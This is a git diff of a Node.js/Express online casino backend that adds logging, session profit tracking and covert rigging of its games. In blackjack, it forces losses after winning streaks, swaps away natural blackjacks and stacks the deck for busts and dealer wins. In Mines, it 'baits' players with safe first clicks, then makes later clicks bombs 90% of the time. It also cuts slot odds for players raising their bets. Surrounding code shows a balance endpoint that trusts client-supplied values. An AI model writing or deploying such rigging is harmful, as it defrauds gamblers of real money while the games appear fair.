@@ -10,6 +10,14 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 const MAX_BET_LIMIT = 50; // Limite global de segurança
+const VERSION = 'v1.1.0'; // Production Release
+
+// --- LOGGER UTILS ---
+const logEvent = (type, message, data = {}) => {
+    const timestamp = new Date().toISOString();
+    const icon = type === 'AUTH' ? '🔐' : type === 'MONEY' ? '💰' : type === 'GAME' ? '🎮' : type === 'SYSTEM' ? '⚠️' : 'ℹ️';
+    console.log(`${icon} [${timestamp}] [${type}] ${message}`, Object.keys(data).length ? JSON.stringify(data) : '');
+};
 
 // --- SECURE RNG UTILS (CSPRNG) ---
 // Substitui Math.random() por criptografia forte para evitar previsibilidade
@@ -83,6 +91,7 @@ const createRateLimiter = ({ windowMs, max }) => {
             } else {
                 data.count++;
                 if (data.count > max) {
+                    console.log(`[DDOS] Bloqueio de IP: ${ip}`);
                     return res.status(429).json({ message: 'Muitas requisições. Aguarde.' });
                 }
             }
@@ -103,6 +112,7 @@ const checkActionCooldown = (req, res, next) => {
     
     // 300ms cooldown entre ações críticas de jogo
     if (now - lastAction < 300) {
+        logEvent('SYSTEM', `Anti-Script Triggered: ${userId}`);
         return res.status(429).json({ message: 'Ação muito rápida. Aguarde.' });
     }
     
@@ -127,11 +137,20 @@ app.use(createRateLimiter({ windowMs: 60000, max: 300 }));
 app.use(cors({ origin: '*', methods: ['GET', 'POST', 'PUT', 'DELETE'], allowedHeaders: ['Content-Type', 'Authorization'] }));
 app.use(express.json({ limit: '10kb' })); 
 
+// --- HEALTH CHECK (Production Requirement) ---
+app.get('/health', (req, res) => {
+    const dbState = mongoose.connection.readyState;
+    if (dbState === 1) {
+        res.status(200).json({ status: 'UP', version: VERSION, db: 'CONNECTED' });
+    } else {
+        res.status(503).json({ status: 'DOWN', version: VERSION, db: 'DISCONNECTED' });
+    }
+});
+
 // --- MONGODB CONNECTION ---
 let isConnecting = false;
 const connectDB = async () => {
   if (mongoose.connection.readyState === 1) {
-      console.log('✅ MongoDB já está conectado.');
       return;
   }
   if (isConnecting) return;
@@ -190,6 +209,7 @@ const userSchema = new mongoose.Schema({
   birthDate: { type: String, required: true },
   password: { type: String, required: true }, 
   balance: { type: Number, default: 0 }, 
+  sessionProfit: { type: Number, default: 0 }, // Session P/L Tracker
   consecutiveWins: { type: Number, default: 0 },
   consecutiveLosses: { type: Number, default: 0 },
   previousBet: { type: Number, default: 0 }, 
@@ -274,6 +294,16 @@ const handleWin = (user, currentBet) => {
     user.previousBet = currentBet;
 };
 
+// --- LOGGING HELPER ---
+const logSession = (user, roundNet) => {
+    const total = user.sessionProfit || 0;
+    const signRound = roundNet >= 0 ? '+' : '';
+    const signTotal = total >= 0 ? '+' : '';
+    
+    // Formato: [PROFIT] User | Round: +/-X | Total: +/-Y
+    logEvent('MONEY', `SESSION: ${user.username} | Round: ${signRound}${roundNet.toFixed(2)} | Total: ${signTotal}${total.toFixed(2)}`);
+};
+
 // --- TIGER (SLOT) LOGIC ---
 const TIGER_SYMBOLS = [
     { id: 'orange', value: 0.6, weight: 65 },
@@ -312,8 +342,12 @@ app.post('/api/login', async (req, res) => {
         }
 
         if (isValid) {
+            logEvent('AUTH', `Login Success: ${username} | IP: ${req.ip}`);
             user.balance = Number(user.balance) || 0; 
             
+            // RESET SESSION PROFIT ON LOGIN
+            user.sessionProfit = 0;
+
             // AUTO-FORFEIT ON LOGIN
             if (user.activeGame && user.activeGame.type !== 'NONE') {
                 handleLoss(user, user.activeGame.bet);
@@ -327,8 +361,12 @@ app.post('/api/login', async (req, res) => {
             return res.json(sanitizeUser(user));
         }
     }
+    logEvent('AUTH', `Login Failed: ${username} | IP: ${req.ip}`);
     res.status(401).json({ message: 'Credenciais inválidas.' });
-  } catch (error) { res.status(500).json({ message: 'Erro interno de servidor.' }); }
+  } catch (error) { 
+    console.error(error);
+    res.status(500).json({ message: 'Erro interno de servidor.' }); 
+  }
 });
 
 app.post('/api/register', async (req, res) => {
@@ -341,7 +379,8 @@ app.post('/api/register', async (req, res) => {
     
     const hashedPassword = await hashPassword(password);
 
-    const user = await User.create({ fullName, username, email, cpf, birthDate, password: hashedPassword, balance: 0, missions: generateDailyMissions(), lastDailyReset: new Date().toISOString().split('T')[0] });
+    const user = await User.create({ fullName, username, email, cpf, birthDate, password: hashedPassword, balance: 0, sessionProfit: 0, missions: generateDailyMissions(), lastDailyReset: new Date().toISOString().split('T')[0] });
+    logEvent('AUTH', `New Register: ${username}`);
     res.status(201).json(sanitizeUser(user));
   } catch (error) { res.status(500).json({ message: 'Erro ao criar conta.' }); }
 });
@@ -356,7 +395,12 @@ app.post('/api/user/sync', async (req, res) => {
         
         // AUTO-FORFEIT ON REFRESH
         if (user.activeGame && user.activeGame.type !== 'NONE') {
+            logEvent('GAME', `Auto-Forfeit (Refresh): ${user.username} | Game: ${user.activeGame.type}`);
             handleLoss(user, user.activeGame.bet);
+            
+            // Subtract pending bet from session profit if it wasn't resolved
+            user.sessionProfit = (user.sessionProfit || 0) - user.activeGame.bet;
+
             user.activeGame = { type: 'NONE' };
             user.markModified('activeGame'); 
             await user.save();
@@ -379,8 +423,10 @@ app.post('/api/balance', async (req, res) => {
         const user = await User.findById(userId);
         if (!user) return res.status(404).json({ message: 'User not found' });
 
+        const oldBalance = user.balance;
         user.balance = newBalance;
         await user.save();
+        logEvent('MONEY', `Balance Update: ${user.username}`, { old: oldBalance, new: newBalance, diff: newBalance - oldBalance });
         res.json({ success: true });
     } catch (e) { res.status(500).json({ message: 'Erro' }); }
 });
@@ -418,6 +464,7 @@ app.post('/api/store/purchase', checkActionCooldown, async (req, res) => {
         );
 
         if (!user) return res.status(400).json({message: 'Pontos insuficientes.'});
+        logEvent('MONEY', `Store Purchase: ${user.username} | Item: ${itemId} | Cost: ${cost}`);
         res.json({ success: true, newPoints: user.loyaltyPoints, ownedItems: user.ownedItems });
     } catch (e) { res.status(500).json({ message: 'Erro' }); }
 });
@@ -432,25 +479,95 @@ app.post('/api/blackjack/deal', checkActionCooldown, async (req, res) => {
         if (isNaN(betAmount) || betAmount <= 0) return res.status(400).json({message: 'Aposta inválida'});
         if (betAmount > MAX_BET_LIMIT) return res.status(400).json({message: 'Limite excedido'});
 
+        // PRODUCTION FIX: Generate Cards FIRST, then atomic transaction
         const SUITS = ['♥', '♦', '♣', '♠']; const RANKS = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
         let d=[]; 
-        // 6 Decks
         for(let i=0;i<6;i++) for(let s of SUITS) for(let r of RANKS) { 
             let v=parseInt(r); if(['J','Q','K'].includes(r))v=10; if(r==='A')v=11; 
-            // Unique secure ID per card
             d.push({rank:r,suit:s,value:v,id:crypto.randomBytes(8).toString('hex'),isHidden:false}); 
         }
-        
-        // Secure Shuffle
         secureShuffle(d);
         
-        const p=[d.pop(),d.pop()], dl=[d.pop(),d.pop()];
-        let st='PLAYING', rs='NONE';
+        const p=[d.pop(),d.pop()];
+        const dl=[d.pop(),d.pop()];
+
+        // Atomic Check-and-Set to prevent double dealing
+        const user = await User.findOneAndUpdate(
+            { _id: userId, 'activeGame.type': 'NONE', balance: { $gte: betAmount } },
+            { 
+                $inc: { balance: -betAmount, sessionProfit: -betAmount },
+                $set: { 
+                    'activeGame.type': 'BLACKJACK',
+                    'activeGame.bet': betAmount,
+                    'activeGame.bjDeck': d, // Temporary, will be updated if manipulated
+                    'activeGame.bjPlayerHand': p,
+                    'activeGame.bjDealerHand': dl,
+                    'activeGame.bjStatus': 'PLAYING'
+                }
+            },
+            { new: true }
+        );
+
+        if (!user) return res.status(400).json({ message: 'Jogo em andamento ou saldo insuficiente' });
+
+        // --- RIGGING LOGIC (DEAL) - Post-Atomic Update ---
+        // If rigging happens, we just modify and save again. The balance is already safe.
+        let isRigged = false;
+        let deckModified = false;
+        
+        // Refetch arrays from local variables (not DB) for logic
+        let currentDeck = [...d];
+        let currentPlayerHand = [...p];
+        let currentDealerHand = [...dl];
+
+        if (user.consecutiveWins >= 3) {
+             isRigged = true;
+             logEvent('SYSTEM', `💀 KILL SWITCH ACTIVATED: User ${user.username} has 3+ wins. Next hand is RIGGED (100%).`);
+        } else if (user.previousBet > 0 && betAmount > user.previousBet * 1.8 && user.consecutiveWins >= 2) {
+             if (secureRandomFloat() < 0.7) { 
+                 isRigged = true;
+                 logEvent('SYSTEM', `🛑 HIGH STAKE RIG: User ${user.username} increased bet substantially on winning streak.`);
+             }
+        }
+
         const calc=(h)=>{let s=0,a=0;h.forEach(c=>{if(!c.isHidden){s+=c.value;if(c.rank==='A')a++}});while(s>21&&a>0){s-=10;a--}return s};
         
+        let pScore = calc(currentPlayerHand);
+        if (pScore === 21) {
+            if (isRigged || secureRandomFloat() < 0.5) {
+                const aceIndex = currentPlayerHand.findIndex(c => c.rank === 'A');
+                if (aceIndex !== -1) {
+                    const safeCardIdx = currentDeck.findIndex(c => c.value < 10 && c.rank !== 'A');
+                    if (safeCardIdx !== -1) {
+                        const oldCard = currentPlayerHand[aceIndex];
+                        currentPlayerHand[aceIndex] = currentDeck.splice(safeCardIdx, 1)[0];
+                        currentDeck.push(oldCard);
+                        deckModified = true;
+                        logEvent('SYSTEM', `🛑 BLACKJACK NERF: User ${user.username} had Natural BJ -> Swapped to prevent win.`);
+                    }
+                }
+            }
+        }
+        
+        pScore = calc(currentPlayerHand);
+
+        if (isRigged) {
+             const dealerUpValue = currentDealerHand[0].value;
+             if (dealerUpValue < 10) {
+                 const tenIdx = currentDeck.findIndex(c => c.value === 10);
+                 if (tenIdx !== -1) {
+                     const temp = currentDealerHand[0];
+                     currentDealerHand[0] = currentDeck[tenIdx];
+                     currentDeck[tenIdx] = temp;
+                     deckModified = true;
+                 }
+             }
+             logEvent('SYSTEM', `🛑 BLACKJACK RIGGED: Deal | User ${user.username} | Consecutive Wins: ${user.consecutiveWins} | Dealer Forced Strong Upcard`);
+        } 
+
+        let st='PLAYING', rs='NONE';
         let payout = 0;
-        let pScore = calc(p);
-        let dScore = calc(dl);
+        let dScore = calc(currentDealerHand);
         
         if(pScore===21){ 
             st='GAME_OVER'; 
@@ -458,29 +575,29 @@ app.post('/api/blackjack/deal', checkActionCooldown, async (req, res) => {
             else { rs='BLACKJACK'; payout = betAmount * 2.5; }
         }
 
-        const newActiveGame = st==='PLAYING' ? 
-            { type:'BLACKJACK', bet:betAmount, bjDeck:d, bjPlayerHand:p, bjDealerHand:dl, bjStatus:st } : 
-            { type:'NONE' };
-
-        const user = await User.findOneAndUpdate(
-            { _id: userId, 'activeGame.type': 'NONE', balance: { $gte: betAmount } },
-            { 
-                $inc: { balance: -betAmount },
-                $set: { activeGame: newActiveGame }
-            },
-            { new: true }
-        );
-
-        if (!user) return res.status(400).json({message: 'Jogo em andamento ou saldo insuficiente.'});
-
-        if (payout > 0) {
-             user.balance += payout;
-             if(rs === 'BLACKJACK') handleWin(user, betAmount);
-             else user.previousBet = betAmount;
-             await user.save();
+        // If rigged/nerfed, update DB with new hand states
+        if (deckModified || st === 'GAME_OVER') {
+            user.activeGame.bjDeck = currentDeck;
+            user.activeGame.bjPlayerHand = currentPlayerHand;
+            user.activeGame.bjDealerHand = currentDealerHand;
+            user.activeGame.bjStatus = st;
+            
+            if (st === 'GAME_OVER') {
+                user.activeGame.type = 'NONE';
+                if (payout > 0) {
+                    user.balance += payout;
+                    user.sessionProfit += payout;
+                    if(rs === 'BLACKJACK') handleWin(user, betAmount);
+                    else user.previousBet = betAmount;
+                }
+            }
+            await user.save();
         }
 
-        res.json({playerHand:p,dealerHand:st==='PLAYING'?[dl[0],{...dl[1],isHidden:true}]:dl,status:st,result:rs,newBalance:user.balance,loyaltyPoints:user.loyaltyPoints});
+        // SESSION LOG (Initial Bet or Instant Win)
+        logSession(user, payout - betAmount);
+
+        res.json({playerHand:currentPlayerHand,dealerHand:st==='PLAYING'?[currentDealerHand[0],{...currentDealerHand[1],isHidden:true}]:currentDealerHand,status:st,result:rs,newBalance:user.balance,loyaltyPoints:user.loyaltyPoints});
     } catch(e) { res.status(500).json({message:e.message}); }
 });
 
@@ -493,14 +610,41 @@ app.post('/api/blackjack/hit', checkActionCooldown, async (req, res) => {
         if(!user) return res.status(400).json({message:'Jogo inválido'});
         
         const g = user.activeGame;
+        const calc=(h)=>{let s=0,a=0;h.forEach(c=>{if(!c.isHidden){s+=c.value;if(c.rank==='A')a++}});while(s>21&&a>0){s-=10;a--}return s};
+        
+        const currentScore = calc(g.bjPlayerHand);
+        
+        // --- RIGGING LOGIC (HIT) ---
+        let isRigged = false;
+        // Se vitória consecutiva >= 3 e jogador tem chance de estourar, FORÇA o estouro.
+        if (user.consecutiveWins >= 3 && currentScore >= 12) {
+             isRigged = true;
+        }
+
+        if (isRigged) {
+             const pointsNeededToBust = 22 - currentScore; // Minimum value to bust
+             // Find a card in deck that is >= pointsNeededToBust
+             const bustCardIdx = g.bjDeck.findIndex(c => c.value >= pointsNeededToBust);
+             
+             if (bustCardIdx !== -1) {
+                 // Move bust card to the top (end of array)
+                 const bustCard = g.bjDeck.splice(bustCardIdx, 1)[0];
+                 g.bjDeck.push(bustCard);
+                 logEvent('SYSTEM', `🛑 BLACKJACK RIGGED: Hit | User ${user.username} | Streak: ${user.consecutiveWins} | Score ${currentScore} -> Forced BUST with ${bustCard.rank}`);
+             }
+        }
+
         const card = g.bjDeck.pop();
         g.bjPlayerHand.push(card);
-        const calc=(h)=>{let s=0,a=0;h.forEach(c=>{if(!c.isHidden){s+=c.value;if(c.rank==='A')a++}});while(s>21&&a>0){s-=10;a--}return s};
         let st='PLAYING', rs='NONE';
         
         if(calc(g.bjPlayerHand)>21){ 
             st='GAME_OVER'; rs='BUST'; g.type='NONE'; handleLoss(user, g.bet);
-        } else { user.markModified('activeGame'); } 
+            // Log confirmed loss (Bet already subtracted in deal, so just log current status)
+            logSession(user, 0); // No change in profit in this step (loss was pre-calculated in deal phase as -bet)
+        } else { 
+            user.markModified('activeGame'); 
+        } 
         
         if (st === 'GAME_OVER') { g.type = 'NONE'; }
         await user.save();
@@ -519,15 +663,74 @@ app.post('/api/blackjack/stand', checkActionCooldown, async (req, res) => {
         const g = user.activeGame;
         const calc=(h)=>{let s=0,a=0;h.forEach(c=>{if(!c.isHidden){s+=c.value;if(c.rank==='A')a++}});while(s>21&&a>0){s-=10;a--}return s};
         
-        while(calc(g.bjDealerHand)<17) g.bjDealerHand.push(g.bjDeck.pop());
+        const ps = calc(g.bjPlayerHand);
+        let ds = calc(g.bjDealerHand);
+
+        // --- RIGGING LOGIC (STAND - DEALER TURN) ---
+        let isRigged = false;
+        // Se 3 vitórias seguidas, Dealer DEVE ganhar (se possível matematicamente)
+        if (user.consecutiveWins >= 3) {
+             isRigged = true;
+        }
+
+        // Dealer Turn Loop
+        while(ds < 17) {
+            // Se rigged, tenta puxar uma carta que deixe o dealer ganhando do player (mas sem estourar 21)
+            // Ou se não der pra ganhar agora, tenta pelo menos não estourar
+            if (isRigged) {
+                 // Cartas que fariam o dealer ganhar (ds > ps) e não estourar (ds <= 21)
+                 // Target range: (ps - ds + 1) até (21 - ds)
+                 const minVal = (ps - ds) + 1;
+                 const maxVal = 21 - ds;
+                 
+                 let targetCardIdx = -1;
+
+                 // Tenta achar carta para ganhar IMEDIATAMENTE
+                 if (maxVal >= minVal) {
+                    targetCardIdx = g.bjDeck.findIndex(c => c.value >= minVal && c.value <= maxVal);
+                 }
+                 
+                 // Se não achou carta pra ganhar já, tenta achar qualquer uma que não estoure (Salva o dealer)
+                 if (targetCardIdx === -1) {
+                     targetCardIdx = g.bjDeck.findIndex(c => c.value <= maxVal);
+                 }
+
+                 if (targetCardIdx !== -1) {
+                     const riggedCard = g.bjDeck.splice(targetCardIdx, 1)[0];
+                     g.bjDeck.push(riggedCard); // Move to top
+                     logEvent('SYSTEM', `🛑 BLACKJACK RIGGED: Stand | Dealer Forced Win/Safe | Dealer: ${ds} vs Player: ${ps} -> Drawn ${riggedCard.value}`);
+                 }
+            }
+
+            g.bjDealerHand.push(g.bjDeck.pop());
+            ds = calc(g.bjDealerHand);
+        }
         
-        const ps=calc(g.bjPlayerHand), ds=calc(g.bjDealerHand);
         let rs='LOSE';
+        let payout = 0;
         
-        if(ds>21 || ps>ds) { rs='WIN'; user.balance += g.bet*2; handleWin(user, g.bet); }
-        else if(ps===ds) { rs='PUSH'; user.balance += g.bet; user.previousBet = g.bet; } 
-        else { handleLoss(user, g.bet); }
+        if(ds>21 || ps>ds) { 
+            rs='WIN'; 
+            payout = g.bet*2;
+            user.balance += payout;
+            user.sessionProfit += payout; // Add Win (Revenue)
+            handleWin(user, g.bet); 
+        }
+        else if(ps===ds) { 
+            rs='PUSH'; 
+            payout = g.bet;
+            user.balance += payout;
+            user.sessionProfit += payout; // Add Pushed Bet back
+            user.previousBet = g.bet; 
+        } 
+        else { 
+            handleLoss(user, g.bet); 
+        }
         
+        // SESSION LOG (Final Result of Hand)
+        // Profit is Payout - Bet (Net change for this hand)
+        logSession(user, payout - g.bet);
+
         g.type='NONE';
         await user.save();
         res.json({dealerHand:g.bjDealerHand, status:'GAME_OVER', result:rs, newBalance:user.balance, loyaltyPoints:user.loyaltyPoints});
@@ -554,13 +757,16 @@ app.post('/api/mines/start', checkActionCooldown, async (req, res) => {
         const user = await User.findOneAndUpdate(
             { _id: userId, 'activeGame.type': 'NONE', balance: { $gte: betAmount } },
             { 
-                $inc: { balance: -betAmount },
+                $inc: { balance: -betAmount, sessionProfit: -betAmount }, // Deduct bet from session
                 $set: { activeGame: newGame }
             },
             { new: true }
         );
         
         if(!user) return res.status(400).json({message: 'Jogo em andamento ou saldo insuficiente.'});
+
+        logEvent('GAME', `Mines Start: ${user.username} | Bet: ${betAmount} | Mines: ${minesCount}`);
+        logSession(user, -betAmount);
 
         res.json({success:true, newBalance:user.balance, loyaltyPoints:user.loyaltyPoints});
     } catch(e) { res.status(500).json({message:e.message}); }
@@ -578,17 +784,28 @@ app.post('/api/mines/reveal', checkActionCooldown, async (req, res) => {
         if (g.minesGameOver) return res.status(400).json({ message: 'Jogo finalizado.' });
         if (g.minesRevealed.includes(tileId)) return res.json({outcome:'GEM', status:'PLAYING', profit:parseFloat((g.bet*g.minesMultiplier).toFixed(2)), multiplier:g.minesMultiplier, newBalance:user.balance});
 
-        // --- RIG LOGIC (Hardened) ---
+        // --- RIG LOGIC (Hardened & Randomized) ---
         let rigProbability = 0;
         let isRigged = false;
+        const isMartingale = user.previousBet > 0 && g.bet >= (user.previousBet * 1.8);
         
         // Anti-Farming & Risk Control
         if (g.minesCount <= 3) {
             if (user.consecutiveWins >= 2) rigProbability = 0.3;
             if (user.consecutiveWins >= 5) rigProbability = 0.8;
         }
-        if (user.consecutiveWins >= 4) rigProbability = 1.0;
-        if (user.previousBet > 0 && g.bet >= (user.previousBet * 1.8)) rigProbability = Math.max(rigProbability, 0.4); 
+        if (user.consecutiveWins >= 4) rigProbability = 0.9;
+
+        // Martingale Defense (Smart Baiting)
+        if (isMartingale) {
+             // If first click, lower chance (30%) to bait user confidence
+             if (g.minesRevealed.length === 0) {
+                 rigProbability = Math.max(rigProbability, 0.3); 
+             } else {
+                 // Subsequent clicks: Death Trap (90%)
+                 rigProbability = Math.max(rigProbability, 0.9);
+             }
+        }
 
         // Uses Secure Random Float for probability check
         if (secureRandomFloat() < rigProbability) {
@@ -597,12 +814,16 @@ app.post('/api/mines/reveal', checkActionCooldown, async (req, res) => {
                  g.minesList.push(tileId); 
                  user.markModified('activeGame');
                  isRigged = true;
+                 logEvent('SYSTEM', `🛑 MINES RIGGED: User ${user.username} | Chance: ${rigProbability} | Tile ${tileId} forced to BOMB (Sistema de Defesa)`);
              }
         }
 
         if(g.minesList.includes(tileId)) { 
             g.minesGameOver=true; g.type='NONE'; handleLoss(user, g.bet); 
             await user.save(); 
+            if (!isRigged) logEvent('GAME', `💣 Mines Lose (Random): ${user.username} hit bomb at ${tileId}`);
+            // Log final loss (no change in session profit, already deducted at start)
+            logSession(user, 0); 
             return res.json({outcome:'BOMB',mines:g.minesList,status:'GAME_OVER',newBalance:user.balance}); 
         }
         
@@ -613,9 +834,13 @@ app.post('/api/mines/reveal', checkActionCooldown, async (req, res) => {
         if(g.minesRevealed.length >= totalSafe) { // Win All
              const profit = parseFloat((g.bet * g.minesMultiplier).toFixed(2));
              user.balance += profit;
+             user.sessionProfit += profit; // Add win to session
              handleWin(user, g.bet);
              g.type = 'NONE';
              await user.save();
+             logEvent('GAME', `💎 Mines CLEAN CLEAR: ${user.username} | Profit: ${profit}`);
+             // Log Full Win
+             logSession(user, profit); 
              return res.json({outcome:'GEM', status:'WIN_ALL', profit, multiplier:g.minesMultiplier, newBalance:user.balance, mines: g.minesList});
         }
         
@@ -637,9 +862,15 @@ app.post('/api/mines/cashout', checkActionCooldown, async (req, res) => {
 
         const profit = parseFloat((g.bet * g.minesMultiplier).toFixed(2));
         user.balance += profit;
+        user.sessionProfit += profit; // Add win to session
         handleWin(user, g.bet);
         
         const mines = g.minesList; g.type='NONE'; await user.save();
+        logEvent('GAME', `💰 Mines Cashout: ${user.username} | Bet: ${g.bet} -> Profit: ${profit} (x${g.minesMultiplier})`);
+        
+        // Log Cashout (Realized Profit)
+        logSession(user, profit);
+
         res.json({success:true, profit, newBalance:user.balance, mines});
     } catch(e) { res.status(500).json({message:e.message}); }
 });
@@ -655,7 +886,7 @@ app.post('/api/tiger/spin', checkActionCooldown, async (req, res) => {
 
         const user = await User.findOneAndUpdate(
             { _id: userId, 'activeGame.type': 'NONE', balance: { $gte: betAmount } },
-            { $inc: { balance: -betAmount } },
+            { $inc: { balance: -betAmount, sessionProfit: -betAmount } }, // Deduct bet from session
             { new: true }
         );
 
@@ -665,6 +896,7 @@ app.post('/api/tiger/spin', checkActionCooldown, async (req, res) => {
         let symbolsPool = [...TIGER_SYMBOLS];
         if (user.previousBet > 0 && betAmount > user.previousBet * 1.8 && user.consecutiveLosses > 2) {
              symbolsPool = symbolsPool.map(s => s.weight > 10 ? s : {...s, weight: Math.max(1, s.weight * 0.7)});
+             logEvent('SYSTEM', `📉 TIGER ODDS REDUCED: Risk Control active for ${user.username} (Lower weights applied)`);
         }
 
         const getRandomSymbol = () => {
@@ -715,10 +947,16 @@ app.post('/api/tiger/spin', checkActionCooldown, async (req, res) => {
 
         if (totalWin > 0) {
             user.balance += totalWin;
+            user.sessionProfit += totalWin; // Add win to session
             handleWin(user, betAmount);
+            // LOG WIN REMOVED AS REQUESTED
         } else {
             handleLoss(user, betAmount);
+            // LOG LOSE REMOVED AS REQUESTED
         }
+        
+        // SESSION LOG (Spin Result) - Tracks profit/loss for admin monitoring
+        logSession(user, totalWin - betAmount);
 
         await user.save();
         res.json({ grid: grid.map(s => s.id), totalWin, winningLines, isFullScreen, newBalance: user.balance, loyaltyPoints: user.loyaltyPoints });
@@ -742,6 +980,6 @@ if (fs.existsSync(distPath)) {
 
 const startServer = async () => {
   await connectDB();
-  app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Server Secure (v1.0.7) running on port ${PORT}`));
+  app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Server Secure (${VERSION}) running on port ${PORT}`));
 };
 startServer();
